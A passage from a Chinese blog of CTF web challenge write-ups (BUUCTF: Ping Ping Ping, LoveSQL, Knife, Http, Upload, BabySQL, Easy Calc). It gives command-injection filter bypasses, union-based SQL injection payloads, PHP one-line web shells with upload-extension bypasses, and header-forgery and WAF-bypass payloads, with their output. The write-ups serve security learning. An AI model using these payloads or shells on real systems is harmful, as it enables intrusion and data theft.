class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p><code>ping 127.0.0.1;ls;cat flag.php</code></p><blockquote><p>/?ip= fxck your space!</p></blockquote><p>?????花里胡哨</p><p>经尝试，过滤了空格</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token constant">PING</span> <span class="token number">1</span> <span class="token punctuation">(</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytesflag<span class="token operator">.</span>phpindex<span class="token operator">.</span>php<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>过滤了flag</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h3><p><code>?ip=127.0.0.1;ls;a=g;b=fla;cat$IFS$b$a.php</code></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong>ps: 参数顺序要注意，ba换位ab，flag会被检测出来：）</strong></p><p>参考：<a href="https://blog.csdn.net/qq_42812036/article/details/104297163?ops_request_misc=%7B%22request_id%22:%22165208109616782391838497%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165208109616782391838497&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-104297163-null-null.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BGXYCTF2019%5DPing+Ping+Ping+1&spm=1018.2226.3001.4187">ctf ping 命令执行</a></p><h1 id="8、-极客大挑战-2019-LoveSQL1"><a href="#8、-极客大挑战-2019-LoveSQL1" class="headerlink" title="8、[极客大挑战 2019]LoveSQL1"></a>8、[极客大挑战 2019]LoveSQL1</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote><p>这群该死的黑客，竟然这么快就找到了我的flag,这次我把它们放在了那个地方，哼哼！</p><p>用户名：</p><p>密  码：                            </p><p>Syclover @ cl4y</p></blockquote><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>1.判断注入点：<code>1&#39; or 1=1#</code> 得到回显：</p><blockquote><p>跳转到了check.php页面。并得到了用户名和密码：</p><h1 id="Login-Success"><a href="#Login-Success" class="headerlink" title="Login Success!"></a>Login Success!</h1><p>Hello admin！</p><p>Your password is ‘be53a02c355072e2ef4eaa93c02c9ffb’</p></blockquote><p>2.尝试密码<a href="https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020">md5</a>解密失败，还是回到注入的思路上，查询字段数：<br>在url中输入：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' order by 3%23&amp;password=1     存在/check.php?username=admin'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>     报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>注意：此时是在url中输入的，所以不能用#，而用其url编码%23。</strong></p><p>3.用<code>union</code>查询测试注入点（回显点位）：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h1 id="Login-Success-1"><a href="#Login-Success-1" class="headerlink" title="Login Success!"></a>Login Success!</h1><p>Hello 2！</p><p>Your password is ‘3’</p></blockquote><p>4.得到回显点位为2和3，查询当前数据库名及版本：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello geek！</p><p>Your password is ‘10.3.18-MariaDB’</p></blockquote><p>5.爆表：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello 2！</p><p>Your password is ‘geekuser,l0ve1ysq1’</p></blockquote><p>6.猜测为：<code>l0ve1ysq1</code>这个表：<br>爆字段：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>l0ve1ysq1'<span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello 2！</p><p>Your password is ‘id,username,password’</p></blockquote><p>7.爆数据：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> l0ve1ysq1<span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello 2！</p><p>Your password is  ‘1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{d9614f96-0272-4d9d-a8e4-de936e0cd958}’</p></blockquote><p>得到flag：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">flag&#123;d9614f96<span class="token operator">-</span><span class="token number">0272</span><span class="token operator">-</span><span class="token number">4</span>d9d<span class="token operator">-</span>a8e4<span class="token operator">-</span>de936e0cd958&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="9、-极客大挑战-2019-Knife1"><a href="#9、-极客大挑战-2019-Knife1" class="headerlink" title="9、[极客大挑战 2019]Knife1"></a>9、[极客大挑战 2019]Knife1</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote><h1 id="我家菜刀丢了，你能帮我找一下么"><a href="#我家菜刀丢了，你能帮我找一下么" class="headerlink" title="我家菜刀丢了，你能帮我找一下么"></a>我家菜刀丢了，你能帮我找一下么</h1><p>eval($_POST[“Syc”]);</p></blockquote><p>诶，感觉这个我会哇，可是我没有菜刀哈哈，不知道我仅有的蚁剑有没有缘分见到flag</p><h2 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h2><p>bp抓包，post传入：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"Syc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>简简单单：在最前面的目录中—-&gt;flag</p><h1 id="10、-极客大挑战-2019-Http1"><a href="#10、-极客大挑战-2019-Http1" class="headerlink" title="10、[极客大挑战 2019]Http1"></a>10、[极客大挑战 2019]Http1</h1><h2 id="知识点概括："><a href="#知识点概括：" class="headerlink" title="知识点概括："></a>知识点概括：</h2><blockquote><ol><li>Referer：Referer是<a href="https://so.csdn.net/so/search?q=header&spm=1001.2101.3001.7020">header</a>的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。”</li><li>UA（User Agent）：“user agent是指用户代理,简称 UA。 作用:使服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。 （概括：一般访问浏览器的名字都会设置在UA）</li><li>X-Forwarded-For ： HTTP 扩展头部。是用来识别通过<a href="https://baike.baidu.com/item/HTTP">HTTP</a><a href="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86">代理</a>或<a href="https://baike.baidu.com/item/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">负载均衡</a>方式连接到<a href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1%E5%99%A8">Web服务器</a>的客户端最原始的<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80">IP地址</a>的HTTP请求头字段。</li></ol></blockquote><h2 id="环境描述："><a href="#环境描述：" class="headerlink" title="环境描述："></a>环境描述：</h2><blockquote><p>页面中没有发现什么有价值的东西，于是F12查看源码，发现：</p><p><code>href=&quot;Secret.php&quot;</code></p></blockquote><p>访问跳转页面：</p><blockquote><p>得到：</p><p><code>It doesn&#39;t come from &#39;https://Sycsecret.buuoj.cn&#39;</code></p><p>此时想到：题目描述是HTTP（请求头伪造？）</p></blockquote><h2 id="hacbar构造payload"><a href="#hacbar构造payload" class="headerlink" title="hacbar构造payload"></a>hacbar构造payload</h2><blockquote><ol><li>构造：Referer:<a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></li><li>提示：<code>Please use &quot;Syclover&quot; browser</code></li><li>构造：<code>User Agent: Syclover</code></li><li>提示：No!!! you can only read this locally!!!</li><li>构造：<code>X-Forwarded-For: 127.0.0.1</code></li><li>得到flag：<code>flag&#123;54d0092a-e344-464a-b1b8-7a179015c8f6&#125;</code></li></ol></blockquote><h2 id="BP抓包修改HTTP请求头"><a href="#BP抓包修改HTTP请求头" class="headerlink" title="BP抓包修改HTTP请求头"></a>BP抓包修改HTTP请求头</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Secret.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">node4.buuoj.cn:26365</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Syclover</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://Sycsecret.buuoj.cn</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：构造的请求头中，每一个参数后需要空格</p></blockquote><h1 id="11、-极客大挑战-2019-Upload1"><a href="#11、-极客大挑战-2019-Upload1" class="headerlink" title="11、[极客大挑战 2019]Upload1"></a>11、[极客大挑战 2019]Upload1</h1><h2 id="环境描述：-1"><a href="#环境描述：-1" class="headerlink" title="环境描述："></a>环境描述：</h2><blockquote><p>文件上传框，提示类型为图片</p><hr></blockquote><blockquote><p>随便提交一个：</p><p>返回：NOT image！</p></blockquote><h2 id="BP抓包"><a href="#BP抓包" class="headerlink" title="BP抓包"></a>BP抓包</h2><blockquote><p>将Content-Type里面的格式改为==image/jpeg==</p><p>post传参，写入一句话木马：</p><p><code>&lt;?php **eval**(@$_POST[&#39;1&#39;]);?&gt;</code></p><p>返回：<strong>NOT！php!</strong></p></blockquote><h2 id="过滤后缀"><a href="#过滤后缀" class="headerlink" title="过滤后缀"></a>过滤后缀</h2><blockquote><p>常见绕过后缀的有文件格式有：php,php3,php4,php5,phtml.pht</p></blockquote><blockquote><p>这里phtml可以绕过，但是返回：<br>`NO! HACKER! your file included ‘&lt;?’</p></blockquote><h2 id="换一句木马"><a href="#换一句木马" class="headerlink" title="换一句木马"></a>换一句木马</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功绕过</p><h2 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h2><blockquote><p>猜测路径为  </p><p><code>http://432fcfb5-9ceb-4e54-9cb2-1eeabd3b10a6.node4.buuoj.cn:81/upload/aWord1.phtml</code></p></blockquote><p>密码：</p><blockquote><p><code>shell</code></p></blockquote><p>根目录下得到flag文件</p><h1 id="12、-ACTF2020-新生赛-Upload1"><a href="#12、-ACTF2020-新生赛-Upload1" class="headerlink" title="12、[ACTF2020 新生赛]Upload1"></a>12、[ACTF2020 新生赛]Upload1</h1><h2 id="环境描述"><a href="#环境描述" class="headerlink" title="环境描述"></a>环境描述</h2><blockquote><p>文件上传</p></blockquote><p>要求格式为：</p><p>考虑：上传一句话木马后发现他有一个白名单，只能上传以这个结尾的文件，那么我们将后缀修改为png上传，再用bp<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>再改为phtml就好</p><p>和上一题思路大致</p><h2 id="BP抓包修改"><a href="#BP抓包修改" class="headerlink" title="BP抓包修改"></a>BP抓包修改</h2><blockquote><p>`Content-Type: image/png</p><?php eval(@$_POST['1']);?><p>`</p></blockquote><p>返回：</p><blockquote><p><code>Upload Success! Look here~ ./uplo4d/11b327e23e72bfb7bf0cc8c9d098384d.phtml</code></p></blockquote><p>构造蚁剑链接</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//d2dbf14f-ace8-4c2a-a53d-55ffd313eb12.node4.buuoj.cn:81/uplo4d/11b327e23e72bfb7bf0cc8c9d098384d.phtml</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><ol><li>这一题好像在前端就进行了文件格式过滤，猜测在js中进行判断，尝试寻找js—–&gt;失败</li><li>只能BP抓包修改后缀类型了</li></ol></blockquote><h1 id="13、-极客大挑战-2019-BabySQL"><a href="#13、-极客大挑战-2019-BabySQL" class="headerlink" title="13、[极客大挑战 2019]BabySQL"></a>13、[极客大挑战 2019]BabySQL</h1><h2 id="环境描述-1"><a href="#环境描述-1" class="headerlink" title="环境描述"></a>环境描述</h2><blockquote><p>username、passwd框</p></blockquote><p><code>应该为注入点</code></p><p>1&gt;</p><pre class="line-numbers language-none"><code class="language-none">?username&#x3D;11&#39;&amp;password&#x3D;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回：</p><blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MariaDB server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'22'</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>2&gt;</p><p>order by 判断列数<code>11&#39; order by 4#</code></p><p>发现order by 被过滤</p><p>返回</p><blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'der 4#'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'22'</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>union、or\where\select也被过滤</p></blockquote><p>3&gt;判断回显位</p><p>新芝士：关键字双写绕过（猜测只过滤一次）</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span><span class="token number">15</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>返回</p><pre class="line-numbers language-sql'" data-language="sql'"><code class="language-sql'">Hello 3！Your password is &#39;4&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p>4&gt;查数据库</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">11</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回</p><blockquote><p>`Hello 2！</p><p>Your password is ‘geek’`</p></blockquote><p>5&gt;查表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">11</span><span class="token string">' ununionion seselectlect 1,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='</span>geek'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回：</p><blockquote><p>Hello b4bsql,geekuser！<br>Your password is ‘geek’</p></blockquote><p>6&gt;查字段</p><pre class="line-numbers language-none"><code class="language-none">11&#39; ununionion seselectlect 1,(seselectlect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),database()%23&amp;password&#x3D;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>返回</p><p><code>Hello id,username,password！</code></p><p><code>Your password is &#39;geek&#39;</code></p></blockquote><p>7&gt;查值</p><pre class="line-numbers language-none"><code class="language-none">11&#39; ununionion seselectlect 1,(seselectlect group_concat(id,username,passwoorrd) frofromm b4bsql),database()%23&amp;password&#x3D;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>返回：</p><p><code>flag&#123;fdbfc75c-253c-482b-8867-dfd6f0dd92e6&#125;！</code></p></blockquote><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><blockquote><p>判断注入点后，常规查询，发现部分关键字被绕过</p></blockquote><h1 id="14、-RoarCTF-2019-Easy-Calc"><a href="#14、-RoarCTF-2019-Easy-Calc" class="headerlink" title="14、[RoarCTF 2019]Easy Calc"></a>14、[RoarCTF 2019]Easy Calc</h1><blockquote><p>没有思路</p></blockquote><p>查询了解到有两个方法</p><blockquote><ol><li>利用php对字符串的处理特性绕过waf</li><li>Http走私</li></ol></blockquote><h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2><blockquote><p>进行绕waf，首先了解一下php的解析规则，当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。</p></blockquote><blockquote><blockquote><p>构造payload来查看目录，用chr转化成ascll码进行绕过</p></blockquote></blockquote><p>payload1：</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">? num</span><span class="token punctuation">=</span><span class="token value attr-value">1;var_dump(scandir(chr(47)))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>1array(24) &#123;  [0]=&gt;  string(1) &quot;.&quot;  [1]=&gt;  string(2) &quot;..&quot;  [2]=&gt;  string(10) &quot;.dockerenv&quot;  [3]=&gt;  string(3) &quot;bin&quot;  [4]=&gt;  string(4) &quot;boot&quot;  [5]=&gt;  string(3) &quot;dev&quot;  [6]=&gt;  string(3) &quot;etc&quot;  [7]=&gt;  string(5) &quot;f1agg&quot;  [8]=&gt;  string(4) &quot;home&quot;  [9]=&gt;  string(3) &quot;lib&quot;  [10]=&gt;  string(5) &quot;lib64&quot;  [11]=&gt;  string(5) &quot;media&quot;  [12]=&gt;  string(3) &quot;mnt&quot;  [13]=&gt;  string(3) &quot;opt&quot;  [14]=&gt;  string(4) &quot;proc&quot;  [15]=&gt;  string(4) &quot;root&quot;  [16]=&gt;  string(3) &quot;run&quot;  [17]=&gt;  string(4) &quot;sbin&quot;  [18]=&gt;  string(3) &quot;srv&quot;  [19]=&gt;  string(8) &quot;start.sh&quot;  [20]=&gt;  string(3) &quot;sys&quot;  [21]=&gt;  string(3) &quot;tmp&quot;  [22]=&gt;  string(3) &quot;usr&quot;  [23]=&gt;  string(3) &quot;var&quot; &#125;</code></p></blockquote><p>payload2：查看flag内容</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">? num</span><span class="token punctuation">=</span><span class="token value attr-value">1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>1string(43) &quot;flag&#123;5392e731-b3c2-45d6-9326-976c11b3c2b0&#125; &quot;</code></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>ctf.show_web9</title>
    <link href="https://kannikanyun.github.io/2022/04/14/ctf.show_web9/"/>
    <id>https://kannikanyun.github.io/2022/04/14/ctf.show_web9/</id>
    <published>2022-04-14T13:52:23.000Z</published>
    <updated>2022-04-14T14:16:45.821Z</updated>
    
